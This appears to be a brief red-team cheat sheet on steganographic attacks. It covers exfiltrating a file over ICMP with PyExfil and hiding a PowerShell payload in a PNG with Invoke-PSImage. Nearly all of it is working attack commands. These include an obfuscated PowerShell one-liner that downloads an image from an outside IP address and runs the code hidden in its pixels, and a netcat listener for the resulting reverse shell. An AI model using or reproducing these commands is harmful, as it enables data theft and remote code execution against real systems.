# Stego Red Team

## Data Exfiltration using ICMP 8

* PyExfil: https://github.com/ytisf/PyExfil

* Target: `python -c 'from pyexfil.network.ICMP.icmp_exfiltration import send_file;ip_addr = "127.0.0.1";send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="/home/kali/stego/PyExfil/1.txt", max_packetsize=512, SLEEP=0.1)'`

* Server: `tcpdump -A icmp -i lo`

## Remote Access using PSImage

* PSImage: https://github.com/peewpw/Invoke-PSImage

* `Import-Module .\Invoke-PSImage.ps1`
* `Invoke-PSImage -Script .\payload.ps1 -Out .\evil.png -Image .\image.png -Web`
* `sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://46.101.222.52/evil.png"));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..500]))`
* `nc -nlvp 444`
